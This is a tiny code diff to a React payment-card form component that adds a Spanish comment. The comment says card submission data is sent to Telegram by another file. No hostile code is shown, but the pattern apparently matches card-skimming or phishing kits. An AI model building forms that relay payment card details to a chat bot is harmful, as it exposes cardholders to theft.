@@ -138,6 +138,7 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
     return Object.keys(newErrors).length === 0
   }
 
+  // ✅ Solo valida y llama a onSubmit — el envío a Telegram lo maneja page.tsx
   const handleSubmit = async () => {
     if (!validate()) return
     setIsSubmitting(true)
